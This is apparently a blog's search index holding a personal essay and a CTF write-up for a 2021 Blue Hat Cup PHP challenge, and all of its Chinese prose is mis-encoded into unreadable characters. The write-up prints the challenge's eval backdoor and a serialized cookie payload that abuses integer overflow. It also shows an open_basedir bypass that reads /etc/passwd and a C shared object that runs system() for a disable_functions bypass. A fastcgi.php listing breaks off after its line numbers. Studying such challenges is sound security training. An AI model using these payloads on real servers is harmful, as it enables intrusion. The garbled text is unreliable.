<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>é—²è°ˆ</title>
      <link href="2021/04/30/%E9%97%B2%E8%B0%88/"/>
      <url>2021/04/30/%E9%97%B2%E8%B0%88/</url>
      
        <content type="html"><![CDATA[<p>æ—¶é—´æ€»æ˜¯è¿‡å¾—é£å¿«ï¼Œè¿›å…¥å¤§å­¦å·²ç»å¿«ä¸¤å¹´äº†ï¼Œå››æœˆå°†è¿‡ï¼Œäº”ä¸€å‡æœŸè¦å›ä¸€è¶Ÿå®¶çœ‹çœ‹è€çˆ·å­å’Œè€å¦ˆå­ï¼Œæ™šä¸Šå’Œä½³å»ç¥é¾™æ¹–è½¬äº†è½¬ï¼Œé£æ™¯è¿˜æ˜¯å¾ˆä¸é”™ã€‚</p><p><img src="https://i.loli.net/2021/04/30/QaUsXqS9BAEPg7k.jpg" alt="ç¥é¾™å¤§å‰§é™¢"></p><p>æ´—æ¾¡çš„æ—¶å€™æƒ³äº†æƒ³ä¼¼ä¹ä»æ¥æ²¡æœ‰ç»™è‡ªå·±å†™è¿‡ä»€ä¹ˆæ‰€è°“çš„æ€»ç»“ï¼Œå›æƒ³è‡ªå·±è¿™ 19 å¹´ï¼Œä¸­äºŒã€å‚»é€¼çš„äº‹æƒ…åšäº†ä¸å°‘ï¼Œå°±æ˜¯è®¤çœŸçš„äº‹æƒ…åšå¾—å¤ªå°‘äº†ï¼Œè®©çˆ¸å¦ˆå¤´ç–¼æ‹…å¿ƒï¼Œä¹Ÿè®©å¾ˆå¤šäººå¤±æœ›ã€‚</p><p>å’Œä½³é—²è°ˆçš„æ—¶å€™èŠèµ·æ¥å°æ—¶å€™çš„äº‹æƒ…ï¼Œæ€»æ˜¯ä¼šè§‰å¾—ç‰¹åˆ«æœ‰æ„æ€ï¼Œé‚£ä¸ªæ—¶å€™è§‰å¾—å¾ˆå¸…ã€å¾ˆè£…Bçš„äº‹æƒ…ï¼Œç°åœ¨çœ‹èµ·æ¥å°´å°¬åˆ°å¯ä»¥ç”¨è„šè¶¾æŠ å‡ºä¸‰å®¤ä¸¤å…ï¼Œæ¯æ¬¡è°ƒä¾ƒè‡ªå·±å½“æ—¶è¢«å®¶é‡Œè€çˆ·å­æŠ“ç€ç—›æ‰“çš„æ—¶å€™ï¼Œä¹Ÿä¼šæƒ³åˆ°å½“æ—¶çš„è‡ªå·±ä¸ºä»€ä¹ˆé‚£ä¹ˆä¼šé—¯ç¥¸æƒ¹äº‹ï¼Œé‚£ä¸ªæ—¶å€™çš„è‡ªå·±è¦æ˜¯çŸ¥é“å¤šå¹´ä¹‹åè‡ªå·±æŠŠè¿™ä¸€åˆ‡å½“ä½œèŒ¶ä½™é¥­åçš„ä¹å­æ´¥æ´¥æœ‰å‘³åœ°å“å°æ—¶ï¼Œä¼šä¸ä¼šç¨å¾®ä¹–ä¸€ç‚¹ï¼Œå°‘è®©è€çˆ·å­æ°”å¾—ç¡ä¸ç€è§‰ã€‚</p><p>ä»å°åˆ°å¤§å°±ä¸€ç›´ä¸å–œæ¬¢åšè€å¸ˆå¸ƒç½®çš„ä½œä¸šï¼Œç›´åˆ°ä»Šå¤©è¿™ä¸€ç‚¹ä¹Ÿæ²¡æœ‰å˜è¿‡ï¼Œå¤§å­¦ä»¥å‰æ˜¯å› ä¸ºçº¯ç²¹çš„æ‡’ï¼Œå¤§å­¦çš„æ—¶å€™æ˜¯æ„Ÿè§‰é‚£äº›ä½œä¸šç¡®å®æ˜¯åšäº†æ²¡ç”¨ï¼Œè™½ç„¶å½’æ ¹ç»“åº•è¿˜æ˜¯æ‡’ï¼Œä½†æ¯•ç«ŸğŸ‘´ä¹Ÿä¸€ç›´ä¸æ˜¯ä¸ªå¬è¯çš„å¥½å­©å­ï¼Œæ‰€ä»¥æ— æ‰€è°“äº†ã€‚</p><p>ä¸€ç›´éƒ½æŒºæ²¡å¿ƒæ²¡è‚ºï¼Œå°å­¦æ˜¯ï¼Œåˆä¸­æ˜¯ï¼Œé«˜ä¸­æœ‰æ”¹å˜ï¼Œä½†æ˜¯ä¹Ÿç¡®å®æ˜¯è¿™æ ·ï¼Œç›´åˆ°ç°åœ¨ä¹Ÿä¼šå¶å°”çŠ¯ç—…ï¼Œä¸è¿‡æ€»å½’æ˜¯æ²¡å°æ—¶å€™é‚£ä¹ˆæ²¡è¡€äº†ã€‚æ€ä¹ˆè¯´å‘¢ï¼Œé«˜ä¸­æ˜¯è½¬å˜æœ€å¤§çš„ä¸€æ®µæ—¶æœŸï¼Œé‡åˆ°äº†ä¸€ç¾¤ä¸€è¾ˆå­çš„å¥½å…„å¼Ÿï¼Œç‹æœ‹ç‹—å‹ç¡®å®ä¹Ÿä¸è¿‡å¦‚æ­¤ï¼Œä¹Ÿæ„Ÿè°¢ @æ•™æˆ @å…¸å“¥ @æ ‘æ–‡ @ å½­å…‹ @å£ @ly @404 @504 ä½ ä»¬è¿™ç¾¤é€†å¤©èµäºˆäº†æˆ‘ <code>å †</code> è¿™ä¸ªåå­—ï¼Œæˆ‘ä»¥åä¹Ÿä¼šä¸€ç›´å¸¦ç€ï¼Œç¡®å®è¢«å«æƒ¯äº†å †å †ï¼Œåœ¨å¤§å­¦çš„æ—¶å€™æˆ‘ä¹Ÿè®©å‘¨å›´çš„äººå«æˆ‘å †å †ï¼Œä»¥åå…¥åœŸä¸ºå®‰ï¼ŒæŠŠå®ƒå†å¸¦åˆ°ä¸‹é¢å»ï¼ŒæŒºå¥½ã€‚</p><p>æ€€å¿µæ¯ä¸ªä¸‹è¯¾å’Œå£å“¥å†²åˆ°äºŒæ¥¼çƒæ¡Œç‹ æŠ½å‡ çƒçš„é«˜ä¸€ï¼›éš”ä¸‰å²”äº”å°±å’Œæ•™æˆã€lyã€å°ä¸ç‚¹åœ¨å•æ‰€æ·±å¤œé—²è°ˆï¼›ä¸ºè‡ªå·±æŸæ¬¡è¶…å¸¸å‘æŒ¥çš„è‹±è¯­æ²¾æ²¾è‡ªå–œï¼›é«˜ä¸‰ä¸‹äº†è¿˜ä¸å¿˜é€ƒè¯¾å»æ‰“ç¯®çƒï¼Œè¢«æŠ“ä½å·®ç‚¹è®°ä¸ªå¤„åˆ†ï¼Œç”šè‡³ç¬¬ä¸€æ¬¡è¿›ç½‘å§ï¼Œä¹Ÿæ˜¯é«˜ä¸‰ä¸‹ã€‚å›å‘³èµ·æ¥è¿˜æŒºæœ‰æ„æ€ï¼Œé«˜ä¸€ä¸Šçš„æ—¶å€™æ¯æ™šéƒ½ä¼šå’Œå£å“¥ç™¾ç±³å†²åˆºè·‘åˆ°é‚£é‡Œå»åƒä¸€ç¢—æ¯”ç™½å¤©å¥½åƒå¤šäº†çš„è›‹ç‚’é¥­ï¼Œä¸´èµ°çš„æ—¶å€™æç‚¹ç«è…¿ï¼Œç®€ç›´å°±æ˜¯æœ€å¥½åƒçš„å¤œå®µã€‚</p><p>ä¹Ÿç»å¸¸ä¼šé—®é—®è‡ªå·±ï¼Œä»¥åæƒ³å¹²ä»€ä¹ˆï¼Œæœ›ç€ä¸è®¨å–œçš„æˆç»©ä¹Ÿæœ‰ä¸ç”˜å •è½ï¼Œé«˜ä¸‰çš„æ—¶å€™ç¡¬æ˜¯æŒ¤è¿›äº†æ‰€è°“çš„ç²¾è‹±ç­ï¼Œéšç¼˜è€ƒè¯•ï¼Œæˆç»©æœ‰å¥½æœ‰åï¼Œä½†åæ­£é«˜è€ƒæ˜¯ä¸å¥½å°±å®Œäº‹äº†ã€‚é«˜è€ƒä¹‹åçš„é‚£æ®µæ—¶é—´ç¡®å®æ˜¯æœ€å¥½ç©çš„æ—¶é—´ï¼Œæ¯å¤©å‡ºé—¨ç–¯ï¼Œé«˜è€ƒå‰åˆ¶å®šçš„ä¹¦å•è®¡åˆ’ä¹Ÿæ˜¯ä¸Šäº†å¤§å­¦æ‰æƒ³èµ·æ¥æœ‰è¿™ä¹ˆä¸€å›äº‹ï¼Œå’Œå…„å¼Ÿä»¬ä¸€èµ·å»äº†æ¡‚æ—ã€æµ·å—ç©ï¼Œæƒ³æ¥ï¼Œè¿™ç¾¤ç‹æœ‹ç‹—å‹ï¼Œä¼¼ä¹çœŸæ˜¯åƒé‡‘éš¾æ¢å§ã€‚</p><p><img src="https://i.loli.net/2021/05/01/iAO5pkrBnPWVMU3.jpg" alt="æ¡‚æ—é˜³æœ”"></p><p>å¤§ä¸€ä¸ŠæœŸçš„æ—¶å€™ï¼Œå¬ç€è€çˆ·å­çš„æŠ¥äº†è®¡ç®—æœºï¼Œä¸€å¼€å§‹ä¹Ÿåªæ˜¯æƒ³ç€å°±é‚£æ ·å­¦å­¦å§ï¼Œæ··ç€å®Œäº‹äº†ï¼Œä¸è¿‡é‡åˆ°äº†å¥¹ä¹‹åï¼Œä¾¿å’Œè‡ªå·±è¾ƒä¸Šäº†åŠ²æ¥ï¼Œä¸å†ç©æ¸¸æˆï¼Œä¹Ÿä¸å‚åŠ æ‰€è°“çš„å¨±ä¹æ´»åŠ¨ï¼Œæœ€å¼€å§‹çš„æ—¶å€™å§ï¼Œæ‹¼å‘½å­¦ ACMï¼Œå°±ä¸ºäº†å¯ä»¥æ¯”è¿™ä¸ªå¥³å­©å­æ›´å¼ºï¼Œâ€œğŸ‘´ä¸èƒ½è®©ä¸€ä¸ªå¥³å­©å­æ’‘æˆ‘ä»¬ç­çš„ç‰Œé¢â€ï¼Œä¹Ÿæˆäº†å½“æ—¶ğŸ‘´å­¦ä¹ çš„ä¸€ä¸ªâ€œå€Ÿå£â€ï¼Œ23333ã€‚åæ¥å’Œå¥¹ä¸€èµ·è¿›äº†å®éªŒå®¤ï¼ŒæŠŠå¥¹çš„æ‰‹æ¡åœ¨æ‰‹é‡Œï¼Œä¸¤ä¸ªäººä¸€èµ·è®¡åˆ’ç€æœªæ¥ï¼Œè®¨è®ºç€è¦ä¸€èµ·åŠªåŠ›ï¼Œè¿™äº›å°±æˆäº†ğŸ‘´å­¦ä¹ æœ€å¤§çš„åŠ¨åŠ›ã€‚</p><p>æ¥è§¦ç½‘å®‰ä¹Ÿä¾¿æ˜¯ä»è¿›å®éªŒå®¤å¼€å§‹çš„ï¼Œæ¥åˆ°äº† 508ï¼Œé‡åˆ°äº†ä¸€ç¾¤å¿—åŒé“åˆçš„ hxdï¼ˆæŒ‡å¹²é¥­ï¼‰ï¼Œå¿˜ä¸äº†å’Œå“å“¥åœ¨å°é»‘å±‹é‡Œé¢ç‹‚å¹²è¯¾è®¾ï¼Œä¸€åˆ‡åƒå¤œå®µï¼›å’Œè€è°¢è€ç§¦å»æ¯”èµ›çº¿ä¸‹é€šå®µæ‰“è”ç›Ÿï¼ˆè™½ç„¶ğŸ‘´å…ˆæºœäº†ï¼‰ï¼Œäº‹åå¬è¯´è€æ¨Šéª‚äº†ä¸€æ™šä¸Šäººï¼ˆç¬‘æ­»ï¼‰ï¼›å’Œç»„é‡Œèšä¸ªå°ä¼šå–å¤šäº†é…’ï¼Œè¢«ä¸€ç¾¤äººçœ‹ç€è·Œè·Œæ’æ’è·‘å›å¯å®¤ï¼Œå¤šæœˆä¹‹åè¿˜å¸®å¿™å›å¿†ï¼ˆä¸¢è„¸ï¼‰ã€‚</p><p>åæ¥å¤§ä¸€ä¸‹æœŸçš„ç–«æƒ…ï¼Œä¸€ç›´å¾…åœ¨å®¶é‡Œï¼ŒçŠ¶æ€è¢«æ¶ˆç£¨æ®†å°½ï¼Œåˆå˜å¾—æ‡’ä¸”æ„šé’ï¼Œåˆå¼€å§‹æ‰“æ¸¸æˆï¼Œç›´åˆ°å¤§äºŒçš„ä¸‹æœŸæ‰ç¼“è¿‡æ¥ï¼Œåˆæ¡èµ·å­¦å¾—ä¸€çŸ¥åŠè§£çš„ä¸€è‚šå­åŠåŠå­å­¦é—®ï¼Œæ²‰äº†æ²‰å¿ƒå»å­¦ï¼Œæ„Ÿè§‰è¿™æ‰å«å­¦åˆ°äº†ä¸œè¥¿ï¼Œä»¥å‰çš„é‚£äº›æµ®åœ¨å¤©ä¸Šçš„å­¦ä¹ ï¼ŒåŠæ¡¶æ°´çš„è‡ªå·±ï¼Œæ ¹æœ¬å•¥ä¹Ÿä¸ä¼šã€‚å¾ˆå–œæ¬¢è°­æ€»çš„ä¸€å¥è¯ï¼šâ€œä½ æœ‰ç‚¹æµ®èºäº†â€ï¼Œç¡®å®æ˜¯å¾ˆæµ®èºäº†ï¼Œæ‰€ä»¥è¿˜æ˜¯è¦ç»§ç»­é™ä¸‹å¿ƒå»å­¦ï¼Œä¸èƒ½å†é€ƒé¿äº†ã€‚</p><p>æ¥ä¸‹æ¥çš„è¯ï¼Œå¸Œæœ›è‡ªå·±å¯ä»¥æ²‰ç¨³ä¸€ç‚¹ï¼Œä¹Ÿè¦å¿«å¿«å­¦åˆ°æ›´å¤šçŸ¥è¯†ï¼Œå¸¦å¥½é“ä¸‰å’Œå›½èµ›ï¼Œæƒ³å¹²çš„äº‹å°±å»å¹²ï¼Œæƒ³è¦åšæŒçš„åšå®¢ä¹Ÿè¦ä¸€ç›´æ›´ï¼Œä¸è¦å†åƒä»¥å‰é‚£æ ·å–œæ¬¢åšé¸½å­ï¼Œå–œæ¬¢æâ€œæ‹–ï¼Œå°±ç¡¬æ‹–â€äº†ã€‚</p><hr><p>@å“å“¥ @è€ç§¦ @åœ†å­ @è²å§ @æ³½è¾° @è€è°¢ @è€æ¨Š @æ”¾æ”¾ï¼Œæ²¡å•¥äº‹ï¼Œå°±å•çº¯æƒ³ @ ä½ ä»¬ä¸€ä¸‹ï¼Œä»¥åç»§ç»­ä¸€èµ·å¥½å¥½å¹²é¥­ï¼ˆbushiï¼Œå¥½å¥½åŠªåŠ›ï¼‰ï¼Œç›¸ä¿¡ 508 çš„å¹²é¥­ä¹‹é­‚ä¼šè¶Šæ¥è¶Šç››ï¼Œç›´åˆ°çªç ´åœ°å¹³çº¿ï¼Œè¶…è¶Šé“¶æ²³ç³»ã€‚</p><p>@515 å¤§å®¶éƒ½æ˜¯å®ä¹¡çš„é€†å¤©ï¼Œè¿˜æœ‰ä¸¤å¹´ï¼Œåæ­£å°±æ˜¯è¦èµ–ç€ç»§ç»­éº»çƒ¦ä½ ä»¬è¿™ç¾¤ç‹—å„¿å­äº†ï¼Œè¿˜æœ‰ä¸Šäº†å¤§å­¦è¿˜å¯ä»¥é‡åˆ° @ly ä½ è¿™ä¸ªé€†å¤©åšåŒå­¦åšå®¤å‹ï¼Œç¡®å®æ™¦æ°”ã€‚</p><p>@ä½³ é‡åˆ°äº†ä½ ï¼Œæ˜¯ğŸ‘´æœ€å¹¸è¿ï¼Œä¹Ÿæ˜¯ğŸ‘´æœ€å¹¸ç¦çš„äº‹æƒ…ï¼ŒJe tâ€™aime pour toujours.</p>]]></content>
      
      
      
        <tags>
            
            <tag> æ‚è°ˆ </tag>
            
            <tag> æˆé•¿ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021_Blue_Hat_WP</title>
      <link href="2021/04/29/2021-Blue-Hat-WP/"/>
      <url>2021/04/29/2021-Blue-Hat-WP/</url>
      
        <content type="html"><![CDATA[<p>æ€ä¹ˆè¯´å‘¢ï¼Œæ¯”èµ›å®‰æ’åœ¨å‘¨å››ï¼Œæ²¡å•¥æ—¶é—´æ‰“ï¼Œé˜Ÿå‹ä»¬éƒ½ä¸Šè¯¾å»äº†ï¼Œæˆ‘å¯å®¤ä¹Ÿæœ‰äº‹æƒ…ï¼Œæ‰€ä»¥è¿™æ¬¡æ¯”èµ›å°±è¿™æ ·äº†ï¼Œæ‰“å¾—ä¸å¥½ï¼Œä½†æ˜¯èµ›åè¿˜æ˜¯è¦å¤ç°ä¸€ä¸‹ã€‚</p><h1 id="web1-Ball-sigin"><a href="#web1-Ball-sigin" class="headerlink" title="web1 Ball_sigin"></a>web1 Ball_sigin</h1><p>ç­¾åˆ°é¢˜ï¼Œjs æ¸¸æˆï¼Œæ²¡çœ‹ã€‚</p><p>çœŸçš„æ˜¯ç©æ¸¸æˆï¼Œæ²¡äº‹äº†ã€‚</p><h1 id="web2-one-Pointer-php"><a href="#web2-one-Pointer-php" class="headerlink" title="web2 one_Pointer_php"></a>web2 one_Pointer_php</h1><p>phpï¼Œæœ€ç»ˆç›®çš„ disable_functionï¼Œä¸ä¼šï¼Œç­‰ä¸€æ³¢èµ›å WP å¤ç°äº†ã€‚</p><p><code>user.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$count</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>add_api.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>=unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line"><span class="variable">$count</span>[++<span class="variable">$user</span>-&gt;count]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$count</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line"><span class="variable">$user</span>-&gt;count+=<span class="number">1</span>;</span><br><span class="line">setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$user</span>=<span class="keyword">new</span> User;</span><br><span class="line"><span class="variable">$user</span>-&gt;count=<span class="number">1</span>;</span><br><span class="line">setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥æ³¨æ„åˆ°æˆ‘ä»¬éœ€è¦æ‰§è¡Œ evalï¼Œä½†æ˜¯æˆ‘ä»¬å…ˆè¦ä½¿ <code>$count=1</code> è¿”å›ä¸€ä¸ª falseï¼Œæ€æ ·æ‰èƒ½è®©ä¸€ä¸ªä¸æ˜¯èµ‹ 0 çš„èµ‹å€¼è¯­å¥è¿”å› false å‘¢â€¦â€¦</p><p>æƒ³åˆ°äº†æº¢å‡ºï¼Œå…³äº <code>$count[]=1</code>ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°è¿™æ ·ä¸€ä¸ªæœ‰è¶£çš„ç°è±¡ï¼š</p><p><img src="http://i.loli.net/2021/04/29/IetDslwnc62dPm5.png"></p><p>å¯ä»¥è§‚å¯Ÿåˆ° <code>$count[]=2</code>ï¼Œä¼šæ•°ç»„çš„ä»æœ€åä¸€ä½ä½ç½®å‘å addï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬ä½¿ç”¨ php max long çš„è¯ï¼Œåº”è¯¥å¯ä»¥ä½¿è¿”å›å‡ºç°é—®é¢˜ä»è€Œç»•è¿‡ <code>if($count[]=1)</code></p><p><img src="https://i.loli.net/2021/04/29/wtO6uyTjIdQS84C.png"></p><p>å¯ä»¥å‘ç°ç¡®å®æŠ¥é”™äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¼€å§‹ eval äº†ï¼Œæ„é€  dataï¼š<code>O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D</code></p><p><img src="https://i.loli.net/2021/04/29/YEx4eDXmy8AbfrL.png"></p><p>successï¼Œokï¼Œçœ‹çœ‹ <code>disable_function</code> å§ï¼š</p><p><img src="https://i.loli.net/2021/04/29/LCEiHt2A3NUDTsP.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">disable_classes: Exception,SplDoublyLinkedList,Error,ErrorException,ArgumentCountError,ArithmeticError,AssertionError,DivisionByZeroError,CompileError,ParseError,TypeError,ValueError,UnhandledMatchError,ClosedGeneratorException,LogicException,BadFunctionCallException,BadMethodCallException,DomainException,InvalidArgumentException,LengthException,OutOfRangeException,PharException,ReflectionException,RuntimeException,OutOfBoundsException,OverflowException,PDOException,RangeException,UnderflowException,UnexpectedValueException,JsonException,SodiumException</span><br><span class="line">disable_functions: stream_socket_client,fsockopen,putenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive</span><br></pre></td></tr></table></figure><p>å¥½ç‹ ï¼Œä¹‹å‰ @LemonPrefect å¸ˆå‚…å’ŒğŸ‘´è¯´ä»–è§‰å¾—å¯ä»¥è¯•è¯•åå°„ç±»ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> ReflectionClass(system(<span class="string">&#x27;calc&#x27;</span>)()) ;</span><br><span class="line"><span class="variable">$count</span>[++<span class="variable">$a</span>]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$count</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;No&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Yes&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸è¿‡ <code>disable_classes</code> é‡Œé¢æŠŠèƒ½å°çš„éƒ½å°äº†ï¼Œæ‰€ä»¥æ²¡åŠæ³•ï¼Œåªèƒ½ç»• df äº†ï¼Œå®³ï¼Œä¸ä¼šäº†ã€‚</p><p>å¯ä»¥é€šè¿‡ <code>DirectoryIterator</code> åˆ—å‡ºç›®å½•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123; <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27;&lt;br&gt;&#x27;</span>); &#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/30/3geAkJQvWsECufP.png"></p><p>æœ‰ <code>open_basedir</code>ï¼Œç»•ä¸€ä¸‹å¯ä»¥è¯»å–ä¸€äº›åŸºæœ¬æ–‡ä»¶ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">&#x27;Du1&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;Du1&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">var_dump(file_get_contents(<span class="string">&quot;/etc/passwd&quot;</span>));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/30/WM2oOZxlL6GhHQ9.png"></p><p>flag è¯»ä¸äº†ï¼Œå‚è€ƒäº† <a href="https://ha1c9on.top/2021/04/29/lmb_one_pointer_php/#i-5">@HA1C9ON</a> å¤§ä½¬çš„åšå®¢å‘ç°è¯»å– <code>php.ini</code> å¯ä»¥å‘ç° so æ–‡ä»¶ï¼Œä¸è¿‡ BUU é‡ŒæŠŠè¿™ä¸ªé¢„æœŸè§£åˆ æ‰äº†ï¼Œä½†æ˜¯è¿˜æœ‰åˆ«çš„æ–¹æ³•å¯ä»¥åšã€‚</p><p><img src="https://i.loli.net/2021/04/30/waLhi9n3coeWUAC.png"></p><p><code>hpdoger.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;ls / &gt;/var/www/html/1&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hpdoger.c -fPIC -shared -o hpdoger.so</span><br></pre></td></tr></table></figure><p><code>fastcgi.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span 